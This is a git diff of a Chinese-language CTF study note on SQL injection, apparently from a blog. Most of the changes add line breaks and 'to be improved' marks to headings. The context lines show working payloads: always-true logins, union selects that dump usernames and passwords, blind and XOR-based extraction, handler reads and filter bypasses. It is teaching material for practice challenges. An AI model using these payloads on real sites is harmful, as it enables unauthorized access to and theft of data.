@@ -14,7 +14,7 @@ typora-root-url: ..
 
 
 
-# 基本概念
+# 基本概念（待完善）
 
 >通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。
 >
@@ -80,7 +80,7 @@ select username,password from user where username = '''
 
 <br>
 
-# 常见方法
+# 常见方法（待完善）
 
 ## 最基本的
 
@@ -158,7 +158,7 @@ select username,password from user where username = '''
   2. 加载字典和其他设置,线程数不要太高,否则容易报429错误
   3. 开始攻击,并根据响应包的长度来判断哪些字符或语句被过滤了.
 
-
+<br>
 
 ## 常规有回显
 
@@ -166,7 +166,9 @@ select username,password from user where username = '''
 1' or '1'='1 
 ```
 
-`#`和`--`都能够起到注释作用,用来让后面的语句失效				
+`#`和`--`都能够起到注释作用,用来让后面的语句失效		
+
+<br>		
 
 ### **union select**:
 
@@ -179,6 +181,8 @@ select username,password from user where username = '''
 //查询具体数据:
 1' and '1'='2' union select user,password from users#
 ```
+
+<br>
 
 ### information_schema被过滤时(有时候被or过滤误伤)
 
@@ -227,6 +231,8 @@ select username,password from user where username = '''
   show engines; 查看引擎 
   default-storage-engine=InnoDB 设置引擎
   ```
+
+<br>
 
 ### 无列名注入
 
@@ -324,7 +330,7 @@ print(flag.lower())
 
 
 
-
+<br>
 
 ### **show**
 
@@ -334,7 +340,9 @@ print(flag.lower())
 1'; show columns from 表名;# //爆某个表中的所有列名
 ```
 
+<br>
 
+<br>
 
 ## 盲注
 
@@ -355,7 +363,7 @@ print(flag.lower())
 id=1' and substr((select group_concat(password) from users), 1, 1) = '5
 ```
 
-
+<br>
 
 ### 利用异或性质进行盲注:
 
@@ -394,6 +402,8 @@ id=1^(substr((select(group_concat(password))from(F1naI1y)),1,1)='g')#  具体数
 ```
 
 [[极客大挑战 2019]FinalSQL](2e610037.html)
+
+<br>
 
 ## 基于报错的注入:
 
@@ -479,7 +489,9 @@ updatexml爆数据
 
 
 
+<br>
 
+<br>
 
 
 
@@ -530,7 +542,9 @@ select(group_concat(column_name))from(information_schema.columns)where((table_na
 
 - **注释符`#`和`--`都被过滤,可以尝试使用`%00`去截断**
 
+<br>
 
+<br>
 
 ## 其他
 
@@ -552,7 +566,7 @@ select * from `1919810931114514`
 //最后执行预处理后的语句:execute 预处理后的变量名
 ```
 
-
+<br>
 
 ### handler
 
@@ -572,6 +586,8 @@ handler 表名 read next;
 handler xxx close;
 ```
 
+<br>
+
 ### md5_sql注入
 
 假设服务器的查询语句为: 其中`$pass`是用户输入的内容
@@ -589,7 +605,7 @@ ffifdyop
 
 这两者在生成二进制的`md5`后可以包含`...' or .. `这样的**万能密码**,能够达到注入目的
 
-
+<br>
 
 ### IF语句逻辑判断
 
@@ -603,7 +619,7 @@ ffifdyop
 
 题目见[Hack World](2e610037.html)
 
-
+<br>
 
 ### 绕过正则匹配
 
@@ -615,7 +631,7 @@ ffifdyop
 /*!50000select*/  
 ```
 
-
+<br>
 
 ### 通过root用户的权限来执行特殊功能
 
@@ -627,7 +643,7 @@ select user(); 可以查看当前数据库连接的用户
 
 ```
 
-
+<br>
 
 ### flag显示不全
 
@@ -639,7 +655,7 @@ select user(); 可以查看当前数据库连接的用户
 reverse(select group_concat(real_flag_1s_here) from users)
 ```
 
-
+<br>
 
 #### replace将之前出来的内容替换成空值
 
@@ -653,7 +669,7 @@ reverse(select group_concat(real_flag_1s_here) from users)
 最后拼接成完整flag:flag{e62bb712-dc5d-4f48-bd21-8758112d0ecf}
 ```
 
-
+<br>
 
 ### 巧妙运用反斜杠
 
